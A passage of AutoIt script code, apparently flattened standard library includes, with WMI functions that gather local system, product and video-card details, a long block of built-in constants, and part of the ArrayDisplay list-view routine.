				$asysteminfo[$i][32] = $objitem.poweronpasswordstatus
				$asysteminfo[$i][33] = $objitem.powerstate
				$asysteminfo[$i][34] = $objitem.powersupplystate
				$asysteminfo[$i][35] = $objitem.primaryownercontact
				$asysteminfo[$i][36] = $objitem.primaryownername
				$asysteminfo[$i][37] = $objitem.resetcapability
				$asysteminfo[$i][38] = $objitem.resetcount
				$asysteminfo[$i][39] = $objitem.resetlimit
				$asysteminfo[$i][40] = $objitem.roles(0)
				$asysteminfo[$i][41] = $objitem.status
				$asysteminfo[$i][42] = $objitem.supportcontactdescription(0)
				$asysteminfo[$i][43] = $objitem.systemstartupdelay
				$asysteminfo[$i][44] = $objitem.systemstartupoptions(0)
				$asysteminfo[$i][45] = $objitem.systemstartupsetting
				$asysteminfo[$i][46] = $objitem.systemtype
				$asysteminfo[$i][47] = $objitem.thermalstate
				$asysteminfo[$i][48] = $objitem.totalphysicalmemory
				$asysteminfo[$i][49] = $objitem.username
				$asysteminfo[$i][50] = $objitem.wakeuptype
				$asysteminfo[$i][51] = $objitem.workgroup
				$i += 1
			Next
			$asysteminfo[0][0] = UBound($asysteminfo) - 1
			If $asysteminfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

	Func _computergetsystemproduct(ByRef $asysproductinfo)
		Local $colitems, $objwmiservice, $objitem
		Dim $asysproductinfo[1][7], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_ComputerSystemProduct", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				ReDim $asysproductinfo[UBound($asysproductinfo) + 1][7]
				$asysproductinfo[$i][0] = $objitem.name
				$asysproductinfo[$i][1] = $objitem.identifyingnumber
				$asysproductinfo[$i][2] = $objitem.skunumber
				$asysproductinfo[$i][3] = $objitem.uuid
				$asysproductinfo[$i][4] = $objitem.description
				$asysproductinfo[$i][5] = $objitem.vendor
				$asysproductinfo[$i][6] = $objitem.version
				$i += 1
			Next
			$asysproductinfo[0][0] = UBound($asysproductinfo) - 1
			If $asysproductinfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

	Func _computergetvideocards(ByRef $avideoinfo)
		Local $colitems, $objwmiservice, $objitem
		Dim $avideoinfo[1][59], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_VideoController", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				ReDim $avideoinfo[UBound($avideoinfo) + 1][59]
				$avideoinfo[$i][0] = $objitem.name
				$avideoinfo[$i][1] = $objitem.acceleratorcapabilities(0)
				$avideoinfo[$i][2] = $objitem.adaptercompatibility
				$avideoinfo[$i][3] = $objitem.adapterdactype
				$avideoinfo[$i][4] = $objitem.description
				$avideoinfo[$i][5] = $objitem.adapterram
				$avideoinfo[$i][6] = $objitem.availability
				$avideoinfo[$i][7] = $objitem.capabilitydescriptions(0)
				$avideoinfo[$i][8] = $objitem.colortableentries
				$avideoinfo[$i][9] = $objitem.configmanagererrorcode
				$avideoinfo[$i][10] = $objitem.configmanageruserconfig
				$avideoinfo[$i][11] = $objitem.creationclassname
				$avideoinfo[$i][12] = $objitem.currentbitsperpixel
				$avideoinfo[$i][13] = $objitem.currenthorizontalresolution
				$avideoinfo[$i][14] = $objitem.currentnumberofcolors
				$avideoinfo[$i][15] = $objitem.currentnumberofcolumns
				$avideoinfo[$i][16] = $objitem.currentnumberofrows
				$avideoinfo[$i][17] = $objitem.currentrefreshrate
				$avideoinfo[$i][18] = $objitem.currentscanmode
				$avideoinfo[$i][19] = $objitem.currentverticalresolution
				$avideoinfo[$i][20] = $objitem.deviceid
				$avideoinfo[$i][21] = $objitem.devicespecificpens
				$avideoinfo[$i][22] = $objitem.dithertype
				$avideoinfo[$i][23] = __stringtodate($objitem.driverdate)
				$avideoinfo[$i][24] = $objitem.driverversion
				$avideoinfo[$i][25] = $objitem.errorcleared
				$avideoinfo[$i][26] = $objitem.errordescription
				$avideoinfo[$i][27] = $objitem.icmintent
				$avideoinfo[$i][28] = $objitem.icmmethod
				$avideoinfo[$i][29] = $objitem.inffilename
				$avideoinfo[$i][30] = $objitem.infsection
				$avideoinfo[$i][31] = $objitem.installeddisplaydrivers
				$avideoinfo[$i][32] = $objitem.lasterrorcode
				$avideoinfo[$i][33] = $objitem.maxmemorysupported
				$avideoinfo[$i][34] = $objitem.maxnumbercontrolled
				$avideoinfo[$i][35] = $objitem.maxrefreshrate
				$avideoinfo[$i][36] = $objitem.minrefreshrate
				$avideoinfo[$i][37] = $objitem.monochrome
				$avideoinfo[$i][38] = $objitem.numberofcolorplanes
				$avideoinfo[$i][39] = $objitem.numberofvideopages
				$avideoinfo[$i][40] = $objitem.pnpdeviceid
				$avideoinfo[$i][41] = $objitem.powermanagementcapabilities(0)
				$avideoinfo[$i][42] = $objitem.powermanagementsupported
				$avideoinfo[$i][43] = $objitem.protocolsupported
				$avideoinfo[$i][44] = $objitem.reservedsystempaletteentries
				$avideoinfo[$i][45] = $objitem.specificationversion
				$avideoinfo[$i][46] = $objitem.status
				$avideoinfo[$i][47] = $objitem.statusinfo
				$avideoinfo[$i][48] = $objitem.systemcreationclassname
				$avideoinfo[$i][49] = $objitem.systemname
				$avideoinfo[$i][50] = $objitem.systempaletteentries
				$avideoinfo[$i][51] = __stringtodate($objitem.timeoflastreset)
				$avideoinfo[$i][52] = $objitem.videoarchitecture
				$avideoinfo[$i][53] = $objitem.videomemorytype
				$avideoinfo[$i][54] = $objitem.videomode
				$avideoinfo[$i][55] = $objitem.videomodedescription
				$avideoinfo[$i][56] = $objitem.videoprocessor
				$i += 1
			Next
			$avideoinfo[0][0] = UBound($avideoinfo) - 1
			If $avideoinfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

#EndRegion Hardware Functions
#Region Internal Functions

	Func __stringversion()
		Return $ci_versioninfo
	EndFunc

	Func __stringtodate($dtmdate)
		Return (StringMid($dtmdate, 5, 2) & "/" & StringMid($dtmdate, 7, 2) & "/" & StringLeft($dtmdate, 4) & " " & StringMid($dtmdate, 9, 2) & ":" & StringMid($dtmdate, 11, 2) & ":" & StringMid($dtmdate, 13, 2))
	EndFunc

#EndRegion Internal Functions
Global Const $opt_coordsrelative = 0
Global Const $opt_coordsabsolute = 1
Global Const $opt_coordsclient = 2
Global Const $opt_errorsilent = 0
Global Const $opt_errorfatal = 1
Global Const $opt_capsnostore = 0
Global Const $opt_capsstore = 1
Global Const $opt_matchstart = 1
Global Const $opt_matchany = 2
Global Const $opt_matchexact = 3
Global Const $opt_matchadvanced = 4
Global Const $ccs_top = 1
Global Const $ccs_nomovey = 2
Global Const $ccs_bottom = 3
Global Const $ccs_noresize = 4
Global Const $ccs_noparentalign = 8
Global Const $ccs_nohilite = 16
Global Const $ccs_adjustable = 32
Global Const $ccs_nodivider = 64
Global Const $ccs_vert = 128
Global Const $ccs_left = 129
Global Const $ccs_nomovex = 130
Global Const $ccs_right = 131
Global Const $dt_drivetype = 1
Global Const $dt_ssdstatus = 2
Global Const $dt_bustype = 3
Global Const $proxy_ie = 0
Global Const $proxy_none = 1
Global Const $proxy_specified = 2
Global Const $objid_window = 0
Global Const $objid_titlebar = -2
Global Const $objid_sizegrip = -7
Global Const $objid_caret = -8
Global Const $objid_cursor = -9
Global Const $objid_alert = -10
Global Const $objid_sound = -11
Global Const $dlg_centerontop = 0
Global Const $dlg_notitle = 1
Global Const $dlg_notontop = 2
Global Const $dlg_textleft = 4
Global Const $dlg_textright = 8
Global Const $dlg_moveable = 16
Global Const $dlg_textvcenter = 32
Global Const $idc_unknown = 0
Global Const $idc_appstarting = 1
Global Const $idc_arrow = 2
Global Const $idc_cross = 3
Global Const $idc_hand = 32649
Global Const $idc_help = 4
Global Const $idc_ibeam = 5
Global Const $idc_icon = 6
Global Const $idc_no = 7
Global Const $idc_size = 8
Global Const $idc_sizeall = 9
Global Const $idc_sizenesw = 10
Global Const $idc_sizens = 11
Global Const $idc_sizenwse = 12
Global Const $idc_sizewe = 13
Global Const $idc_uparrow = 14
Global Const $idc_wait = 15
Global Const $idi_application = 32512
Global Const $idi_asterisk = 32516
Global Const $idi_exclamation = 32515
Global Const $idi_hand = 32513
Global Const $idi_question = 32514
Global Const $idi_winlogo = 32517
Global Const $idi_shield = 32518
Global Const $idi_error = $idi_hand
Global Const $idi_information = $idi_asterisk
Global Const $idi_warning = $idi_exclamation
Global Const $sd_logoff = 0
Global Const $sd_shutdown = 1
Global Const $sd_reboot = 2
Global Const $sd_force = 4
Global Const $sd_powerdown = 8
Global Const $sd_forcehung = 16
Global Const $sd_standby = 32
Global Const $sd_hibernate = 64
Global Const $stdin_child = 1
Global Const $stdout_child = 2
Global Const $stderr_child = 4
Global Const $stderr_merged = 8
Global Const $stdio_inherit_parent = 16
Global Const $run_create_new_console = 65536
Global Const $ubound_dimensions = 0
Global Const $ubound_rows = 1
Global Const $ubound_columns = 2
Global Const $mouseeventf_absolute = 32768
Global Const $mouseeventf_move = 1
Global Const $mouseeventf_leftdown = 2
Global Const $mouseeventf_leftup = 4
Global Const $mouseeventf_rightdown = 8
Global Const $mouseeventf_rightup = 16
Global Const $mouseeventf_middledown = 32
Global Const $mouseeventf_middleup = 64
Global Const $mouseeventf_wheel = 2048
Global Const $mouseeventf_xdown = 128
Global Const $mouseeventf_xup = 256
Global Const $reg_none = 0
Global Const $reg_sz = 1
Global Const $reg_expand_sz = 2
Global Const $reg_binary = 3
Global Const $reg_dword = 4
Global Const $reg_dword_little_endian = 4
Global Const $reg_dword_big_endian = 5
Global Const $reg_link = 6
Global Const $reg_multi_sz = 7
Global Const $reg_resource_list = 8
Global Const $reg_full_resource_descriptor = 9
Global Const $reg_resource_requirements_list = 10
Global Const $reg_qword = 11
Global Const $reg_qword_little_endian = 11
Global Const $hwnd_bottom = 1
Global Const $hwnd_notopmost = -2
Global Const $hwnd_top = 0
Global Const $hwnd_topmost = -1
Global Const $swp_nosize = 1
Global Const $swp_nomove = 2
Global Const $swp_nozorder = 4
Global Const $swp_noredraw = 8
Global Const $swp_noactivate = 16
Global Const $swp_framechanged = 32
Global Const $swp_drawframe = 32
Global Const $swp_showwindow = 64
Global Const $swp_hidewindow = 128
Global Const $swp_nocopybits = 256
Global Const $swp_noownerzorder = 512
Global Const $swp_noreposition = 512
Global Const $swp_nosendchanging = 1024
Global Const $swp_defererase = 8192
Global Const $swp_asyncwindowpos = 16384
Global Const $keyword_default = 1
Global Const $keyword_null = 2
Global Const $declared_local = -1
Global Const $declared_unknown = 0
Global Const $declared_global = 1
Global Const $assign_create = 0
Global Const $assign_forcelocal = 1
Global Const $assign_forceglobal = 2
Global Const $assign_existfail = 4
Global Const $bi_enable = 0
Global Const $bi_disable = 1
Global Const $break_enable = 1
Global Const $break_disable = 0
Global Const $cdtray_open = "open"
Global Const $cdtray_closed = "closed"
Global Const $send_default = 0
Global Const $send_raw = 1
Global Const $dir_default = 0
Global Const $dir_extended = 1
Global Const $dir_norecurse = 2
Global Const $dir_remove = 1
Global Const $dt_all = "ALL"
Global Const $dt_cdrom = "CDROM"
Global Const $dt_removable = "REMOVABLE"
Global Const $dt_fixed = "FIXED"
Global Const $dt_network = "NETWORK"
Global Const $dt_ramdisk = "RAMDISK"
Global Const $dt_unknown = "UNKNOWN"
Global Const $dt_undefined = 1
Global Const $dt_fat = "FAT"
Global Const $dt_fat32 = "FAT32"
Global Const $dt_exfat = "exFAT"
Global Const $dt_ntfs = "NTFS"
Global Const $dt_nwfs = "NWFS"
Global Const $dt_cdfs = "CDFS"
Global Const $dt_udf = "UDF"
Global Const $dma_default = 0
Global Const $dma_persistent = 1
Global Const $dma_authentication = 8
Global Const $ds_unknown = "UNKNOWN"
Global Const $ds_ready = "READY"
Global Const $ds_notready = "NOTREADY"
Global Const $ds_invalid = "INVALID"
Global Const $mouse_click_left = "left"
Global Const $mouse_click_right = "right"
Global Const $mouse_click_middle = "middle"
Global Const $mouse_click_main = "main"
Global Const $mouse_click_menu = "menu"
Global Const $mouse_click_primary = "primary"
Global Const $mouse_click_secondary = "secondary"
Global Const $mouse_wheel_up = "up"
Global Const $mouse_wheel_down = "down"
Global Const $number_auto = 0
Global Const $number_32bit = 1
Global Const $number_64bit = 2
Global Const $number_double = 3
Global Const $obj_name = 1
Global Const $obj_string = 2
Global Const $obj_progid = 3
Global Const $obj_file = 4
Global Const $obj_module = 5
Global Const $obj_clsid = 6
Global Const $obj_iid = 7
Global Const $exitclose_normal = 0
Global Const $exitclose_byexit = 1
Global Const $exitclose_byclick = 2
Global Const $exitclose_bylogoff = 3
Global Const $exitclose_byshutdown = 4
Global Const $process_stats_memory = 0
Global Const $process_stats_io = 1
Global Const $process_low = 0
Global Const $process_belownormal = 1
Global Const $process_normal = 2
Global Const $process_abovenormal = 3
Global Const $process_high = 4
Global Const $process_realtime = 5
Global Const $run_logon_noprofile = 0
Global Const $run_logon_profile = 1
Global Const $run_logon_network = 2
Global Const $run_logon_inherit = 4
Global Const $sound_nowait = 0
Global Const $sound_wait = 1
Global Const $shex_open = "open"
Global Const $shex_edit = "edit"
Global Const $shex_print = "print"
Global Const $shex_properties = "properties"
Global Const $tcp_data_default = 0
Global Const $tcp_data_binary = 1
Global Const $udp_open_default = 0
Global Const $udp_open_broadcast = 1
Global Const $udp_data_default = 0
Global Const $udp_data_binary = 1
Global Const $udp_data_array = 2
Global Const $tip_noicon = 0
Global Const $tip_infoicon = 1
Global Const $tip_warningicon = 2
Global Const $tip_erroricon = 3
Global Const $tip_balloon = 1
Global Const $tip_center = 2
Global Const $tip_forcevisible = 4
Global Const $windows_noontop = 0
Global Const $windows_ontop = 1
Global Const $win_state_exists = 1
Global Const $win_state_visible = 2
Global Const $win_state_enabled = 4
Global Const $win_state_active = 8
Global Const $win_state_minimized = 16
Global Const $win_state_maximized = 32
Global Const $mb_ok = 0
Global Const $mb_okcancel = 1
Global Const $mb_abortretryignore = 2
Global Const $mb_yesnocancel = 3
Global Const $mb_yesno = 4
Global Const $mb_retrycancel = 5
Global Const $mb_canceltrycontinue = 6
Global Const $mb_help = 16384
Global Const $mb_iconstop = 16
Global Const $mb_iconerror = 16
Global Const $mb_iconhand = 16
Global Const $mb_iconquestion = 32
Global Const $mb_iconexclamation = 48
Global Const $mb_iconwarning = 48
Global Const $mb_iconinformation = 64
Global Const $mb_iconasterisk = 64
Global Const $mb_usericon = 128
Global Const $mb_defbutton1 = 0
Global Const $mb_defbutton2 = 256
Global Const $mb_defbutton3 = 512
Global Const $mb_defbutton4 = 768
Global Const $mb_applmodal = 0
Global Const $mb_systemmodal = 4096
Global Const $mb_taskmodal = 8192
Global Const $mb_default_desktop_only = 131072
Global Const $mb_right = 524288
Global Const $mb_rtlreading = 1048576
Global Const $mb_setforeground = 65536
Global Const $mb_topmost = 262144
Global Const $mb_service_notification = 2097152
Global Const $mb_rightjustified = $mb_right
Global Const $idtimeout = -1
Global Const $idok = 1
Global Const $idcancel = 2
Global Const $idabort = 3
Global Const $idretry = 4
Global Const $idignore = 5
Global Const $idyes = 6
Global Const $idno = 7
Global Const $idclose = 8
Global Const $idhelp = 9
Global Const $idtryagain = 10
Global Const $idcontinue = 11
Global Const $str_nocasesense = 0
Global Const $str_casesense = 1
Global Const $str_nocasesensebasic = 2
Global Const $str_stripleading = 1
Global Const $str_striptrailing = 2
Global Const $str_stripspaces = 4
Global Const $str_stripall = 8
Global Const $str_chrsplit = 0
Global Const $str_entiresplit = 1
Global Const $str_nocount = 2
Global Const $str_regexpmatch = 0
Global Const $str_regexparraymatch = 1
Global Const $str_regexparrayfullmatch = 2
Global Const $str_regexparrayglobalmatch = 3
Global Const $str_regexparrayglobalfullmatch = 4
Global Const $str_endisstart = 0
Global Const $str_endnotstart = 1
Global Const $sb_ansi = 1
Global Const $sb_utf16le = 2
Global Const $sb_utf16be = 3
Global Const $sb_utf8 = 4
Global Const $se_utf16 = 0
Global Const $se_ansi = 1
Global Const $se_utf8 = 2
Global Const $str_utf16 = 0
Global Const $str_ucs2 = 1
#Region Global Variables and Constants
	Global Const $_arrayconstant_sortinfosize = 11
	Global $__g_aarraydisplay_sortinfo[$_arrayconstant_sortinfosize]
	Global Const $arraydisplay_colalignleft = 0
	Global Const $arraydisplay_transpose = 1
	Global Const $arraydisplay_colalignright = 2
	Global Const $arraydisplay_colaligncenter = 4
	Global Const $arraydisplay_verbose = 8
	Global Const $arraydisplay_norow = 64
	Global Const $_arrayconstant_taghditem = "uint Mask;int XY;ptr Text;handle hBMP;int TextMax;int Fmt;lparam Param;int Image;int Order;uint Type;ptr pFilter;uint State"
	Global Const $_arrayconstant_taglvitem = "struct;uint Mask;int Item;int SubItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;lparam Param;" & "int Indent;int GroupID;uint Columns;ptr pColumns;ptr piColFmt;int iGroup;endstruct"
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list

Func __arraydisplay_share(Const ByRef $aarray, $stitle = Default, $sarrayrange = Default, $iflags = Default, $vuser_separator = Default, $sheader = Default, $imax_colwidth = Default, $huser_function = Default, $bdebug = True)
	Local $vtmp, $smsgboxtitle = (($bdebug) ? ("DebugArray") : ("ArrayDisplay"))
	If $stitle = Default Then $stitle = $smsgboxtitle
	If $sarrayrange = Default Then $sarrayrange = ""
	If $iflags = Default Then $iflags = 0
	If $vuser_separator = Default Then $vuser_separator = ""
	If $sheader = Default Then $sheader = ""
	If $imax_colwidth = Default Then $imax_colwidth = 350
	If $huser_function = Default Then $huser_function = 0
	Local $itranspose = BitAND($iflags, $arraydisplay_transpose)
	Local $icolalign = BitAND($iflags, 6)
	Local $iverbose = BitAND($iflags, $arraydisplay_verbose)
	Local $inorow = BitAND($iflags, $arraydisplay_norow)
	Local $ibuttonborder = (($bdebug) ? (40) : (20))
	Local $smsg = "", $iret = 1
	If IsArray($aarray) Then
		Local $idimension = UBound($aarray, $ubound_dimensions), $irowcount = UBound($aarray, $ubound_rows), $icolcount = UBound($aarray, $ubound_columns)
		If $idimension > 2 Then
			$smsg = "Larger than 2D array passed to function"
			$iret = 2
		EndIf
		If $idimension = 1 Then
			$itranspose = 0
		EndIf
	Else
		$smsg = "No array variable passed to function"
	EndIf
	If $smsg Then
		If $iverbose AND MsgBox($mb_systemmodal + $mb_iconerror + $mb_yesno, $smsgboxtitle & " Error: " & $stitle, $smsg & @CRLF & @CRLF & "Exit the script?") = $idyes Then
			Exit
		Else
			Return SetError($iret, 0, 0)
		EndIf
	EndIf
	Local $icw_colwidth = Number($vuser_separator)
	Local $scurr_separator = Opt("GUIDataSeparatorChar")
	If $vuser_separator = "" Then $vuser_separator = $scurr_separator
	Local $iitem_start = 0, $iitem_end = $irowcount - 1, $isubitem_start = 0, $isubitem_end = (($idimension = 2) ? ($icolcount - 1) : (0))
	Local $brange_flag = False, $avrangesplit
	If $sarrayrange Then
		Local $aarray_range = StringRegExp($sarrayrange & "||", "(?U)(.*)\|", 3)
		If $aarray_range[0] Then
			$avrangesplit = StringSplit($aarray_range[0], ":")
			If @error Then
				$iitem_end = Number($avrangesplit[1])
			Else
				$iitem_start = Number($avrangesplit[1])
				If $avrangesplit[2] <> "" Then
					$iitem_end = Number($avrangesplit[2])
				EndIf
			EndIf
		EndIf
		If $iitem_start < 0 Then $iitem_start = 0
		If $iitem_end > $irowcount - 1 Then $iitem_end = $irowcount - 1
		If $iitem_start > $iitem_end Then
			$vtmp = $iitem_start
			$iitem_start = $iitem_end
			$iitem_end = $vtmp
		EndIf
		If $iitem_start <> 0 OR $iitem_end <> $irowcount - 1 Then $brange_flag = True
		If $idimension = 2 AND $aarray_range[1] Then
			$avrangesplit = StringSplit($aarray_range[1], ":")
			If @error Then
				$isubitem_end = Number($avrangesplit[1])
			Else
				$isubitem_start = Number($avrangesplit[1])
				If $avrangesplit[2] <> "" Then
					$isubitem_end = Number($avrangesplit[2])
				EndIf
			EndIf
			If $isubitem_start > $isubitem_end Then
				$vtmp = $isubitem_start
				$isubitem_start = $isubitem_end
				$isubitem_end = $vtmp
			EndIf
			If $isubitem_start < 0 Then $isubitem_start = 0
			If $isubitem_end > $icolcount - 1 Then $isubitem_end = $icolcount - 1
			If $isubitem_start <> 0 OR $isubitem_end <> $icolcount - 1 Then $brange_flag = True
		EndIf
	EndIf
	Local $sdisplaydata = "[" & $irowcount & "]"
	If $idimension = 2 Then
		$sdisplaydata &= " [" & $icolcount & "]"
	EndIf
	Local $stipdata = ""
	If $brange_flag Then
		If $stipdata Then $stipdata &= " - "
		$stipdata &= "Range set"
	EndIf
	If $itranspose Then
		If $stipdata Then $stipdata &= " - "
		$stipdata &= "Transposed"
	EndIf
	Local $asheader = StringSplit($sheader, $scurr_separator, $str_nocount)
	If UBound($asheader) = 0 Then Local $asheader[1] = [""]
	$sheader = "Row"
	Local $iindex = $isubitem_start
	If $itranspose Then
		$sheader = "Col"
		For $j = $iitem_start To $iitem_end
			$sheader &= $scurr_separator & "Row " & $j
		Next
	Else
		If $asheader[0] Then
			For $iindex = $isubitem_start To $isubitem_end
				If $iindex >= UBound($asheader) Then ExitLoop
				$sheader &= $scurr_separator & $asheader[$iindex]
			Next
		EndIf
		For $j = $iindex To $isubitem_end
			$sheader &= $scurr_separator & "Col " & $j
		Next
	EndIf
	If $inorow Then $sheader = StringTrimLeft($sheader, 4)
	If $iverbose AND ($iitem_end - $iitem_start + 1) * ($isubitem_end - $isubitem_start + 1) > 10000 Then
		SplashTextOn($smsgboxtitle, "Preparing display" & @CRLF & @CRLF & "Please be patient", 300, 100)
	EndIf
	Local Const $_arrayconstant_gui_dockbottom = 64
	Local Const $_arrayconstant_gui_dockborders = 102
	Local Const $_arrayconstant_gui_dockheight = 512
	Local Const $_arrayconstant_gui_dockleft = 2
	Local Const $_arrayconstant_gui_dockright = 4
	Local Const $_arrayconstant_gui_dockhcenter = 8
	Local Const $_arrayconstant_gui_event_close = -3
	Local Const $_arrayconstant_gui_focus = 256
	Local Const $_arrayconstant_ss_center = 1
	Local Const $_arrayconstant_ss_centerimage = 512
	Local Const $_arrayconstant_lvm_getitemcount = (4096 + 4)
	Local Const $_arrayconstant_lvm_getitemrect = (4096 + 14)
	Local Const $_arrayconstant_lvm_getcolumnwidth = (4096 + 29)
	Local Const $_arrayconstant_lvm_setcolumnwidth = (4096 + 30)
	Local Const $_arrayconstant_lvm_getitemstate = (4096 + 44)
	Local Const $_arrayconstant_lvm_getselectedcount = (4096 + 50)
	Local Const $_arrayconstant_lvm_setextendedlistviewstyle = (4096 + 54)
	Local Const $_arrayconstant_lvs_ex_gridlines = 1
	Local Const $_arrayconstant_lvis_selected = 2
	Local Const $_arrayconstant_lvs_showselalways = 8
	Local Const $_arrayconstant_lvs_ex_fullrowselect = 32
	Local Const $_arrayconstant_ws_ex_clientedge = 512
	Local Const $_arrayconstant_ws_maximizebox = 65536
	Local Const $_arrayconstant_ws_minimizebox = 131072
	Local Const $_arrayconstant_ws_sizebox = 262144
	Local Const $_arrayconstant_wm_setredraw = 11
	Local Const $_arrayconstant_lvscw_autosize = -1
	Local Const $_arrayconstant_lvscw_autosize_useheader = -2
	Local $icoordmode = Opt("GUICoordMode", 1)
	Local $iorgwidth = 210, $iheight = 200, $iminsize = 250
	Local $hgui = GUICreate($stitle, $iorgwidth, $iheight, Default, Default, BitOR($_arrayconstant_ws_sizebox, $_arrayconstant_ws_minimizebox, $_arrayconstant_ws_maximizebox))
	Local $aiguisize = WinGetClientSize($hgui)
	Local $ibuttonwidth_1 = $aiguisize[0] / 2
	Local $ibuttonwidth_2 = $aiguisize[0] / 3
	Local $idlistview = GUICtrlCreateListView($sheader, 0, 0, $aiguisize[0], $aiguisize[1] - $ibuttonborder, $_arrayconstant_lvs_showselalways)
	GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_setextendedlistviewstyle, $_arrayconstant_lvs_ex_gridlines, $_arrayconstant_lvs_ex_gridlines)
	GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_setextendedlistviewstyle, $_arrayconstant_lvs_ex_fullrowselect, $_arrayconstant_lvs_ex_fullrowselect)
	GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_setextendedlistviewstyle, $_arrayconstant_ws_ex_clientedge, $_arrayconstant_ws_ex_clientedge)
	Local $idcopy_id = 9999, $idcopy_data = 99999, $iddata_label = 99999, $iduser_func = 99999, $idexit_script = 99999
	If $bdebug Then
		$idcopy_id = GUICtrlCreateButton("Copy Data && Hdr/Row", 0, $aiguisize[1] - $ibuttonborder, $ibuttonwidth_1, 20)
		$idcopy_data = GUICtrlCreateButton("Copy Data Only", $ibuttonwidth_1, $aiguisize[1] - $ibuttonborder, $ibuttonwidth_1, 20)
		Local $ibuttonwidth_var = $ibuttonwidth_1
		Local $ioffset = $ibuttonwidth_1
		If IsFunc($huser_function) Then
			$iduser_func = GUICtrlCreateButton("Run User Func", $ibuttonwidth_2, $aiguisize[1] - 20, $ibuttonwidth_2, 20)
			$ibuttonwidth_var = $ibuttonwidth_2
			$ioffset = $ibuttonwidth_2 * 2
		EndIf
		$idexit_script = GUICtrlCreateButton("Exit Script", $ioffset, $aiguisize[1] - 20, $ibuttonwidth_var, 20)
		$iddata_label = GUICtrlCreateLabel($sdisplaydata, 0, $aiguisize[1] - 20, $ibuttonwidth_var, 18, BitOR($_arrayconstant_ss_center, $_arrayconstant_ss_centerimage))
	Else
		$iddata_label = GUICtrlCreateLabel($sdisplaydata, 0, $aiguisize[1] - 20, $aiguisize[0], 18, BitOR($_arrayconstant_ss_center, $_arrayconstant_ss_centerimage))
	EndIf
	Select 
		Case $itranspose OR $brange_flag
			GUICtrlSetColor($iddata_label, 16711680)
			GUICtrlSetTip($iddata_label, $stipdata)
	EndSelect
	GUICtrlSetResizing($idlistview, $_arrayconstant_gui_dockborders)
	GUICtrlSetResizing($idcopy_id, $_arrayconstant_gui_dockleft + $_arrayconstant_gui_dockbottom + $_arrayconstant_gui_dockheight)
	GUICtrlSetResizing($idcopy_data, $_arrayconstant_gui_dockright + $_arrayconstant_gui_dockbottom + $_arrayconstant_gui_dockheight)
	GUICtrlSetResizing($iddata_label, $_arrayconstant_gui_dockleft + $_arrayconstant_gui_dockbottom + $_arrayconstant_gui_dockheight)
	GUICtrlSetResizing($iduser_func, $_arrayconstant_gui_dockhcenter + $_arrayconstant_gui_dockbottom + $_arrayconstant_gui_dockheight)
	GUICtrlSetResizing($idexit_script, $_arrayconstant_gui_dockright + $_arrayconstant_gui_dockbottom + $_arrayconstant_gui_dockheight)
	GUICtrlSendMsg($idlistview, $_arrayconstant_wm_setredraw, 0, 0)
	Local $irowindex, $icolfill
	If $itranspose Then
		For $i = $isubitem_start To $isubitem_end
			$irowindex = __arraydisplay_additem($idlistview, "NULL")
			If $inorow Then
				$icolfill = 0
			Else
				__arraydisplay_addsubitem($idlistview, $irowindex, "Col " & $i, 0)
				$icolfill = 1
			EndIf
			For $j = $iitem_start To $iitem_end
				If $idimension = 2 Then
					$vtmp = $aarray[$j][$i]
				Else
					$vtmp = $aarray[$j]
				EndIf
				Switch VarGetType($vtmp)
					Case "Array"
						__arraydisplay_addsubitem($idlistview, $irowindex, "{Array}", $icolfill)
					Case Else
						__arraydisplay_addsubitem($idlistview, $irowindex, $vtmp, $icolfill)
				EndSwitch
				$icolfill += 1
			Next
		Next
	Else
		For $i = $iitem_start To $iitem_end
			$irowindex = __arraydisplay_additem($idlistview, "NULL")
			If $inorow Then
				$icolfill = 0
			Else
				__arraydisplay_addsubitem($idlistview, $irowindex, "Row " & $i, 0)
				$icolfill = 1
			EndIf
			For $j = $isubitem_start To $isubitem_end
				If $idimension = 2 Then
					$vtmp = $aarray[$i][$j]
				Else
					$vtmp = $aarray[$i]
				EndIf
				Switch VarGetType($vtmp)
					Case "Array"
						__arraydisplay_addsubitem($idlistview, $irowindex, "{Array}", $icolfill)
					Case Else
						__arraydisplay_addsubitem($idlistview, $irowindex, $vtmp, $icolfill)
				EndSwitch
				$icolfill += 1
			Next
		Next
	EndIf
	If $icolalign Then
		For $i = 0 To $icolfill - 1
			__arraydisplay_justifycolumn($idlistview, $i, $icolalign / 2)
		Next
	EndIf
	GUICtrlSendMsg($idlistview, $_arrayconstant_wm_setredraw, 1, 0)
	Local $iborder = (($irowindex > 19) ? (65) : (45))
	Local $iwidth = $iborder, $icolwidth = 0, $aicolwidth[$icolfill], $imin_colwidth = 55
	For $i = 0 To UBound($aicolwidth) - 1
		GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_setcolumnwidth, $i, $_arrayconstant_lvscw_autosize)
		$icolwidth = GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_getcolumnwidth, $i, 0)
		If $sheader <> "" Then
			GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_setcolumnwidth, $i, $_arrayconstant_lvscw_autosize_useheader)
			Local $icolwidthheader = GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_getcolumnwidth, $i, 0)
			If $icolwidth < $imin_colwidth AND $icolwidthheader < $imin_colwidth Then
				GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_setcolumnwidth, $i, $imin_colwidth)
				$icolwidth = $imin_colwidth
			ElseIf $icolwidthheader < $icolwidth Then
				GUICtrlSendMsg($idlistview, $_arrayconstant_lvm_setcolumnwidth, $i, $icolwidth)
			Else
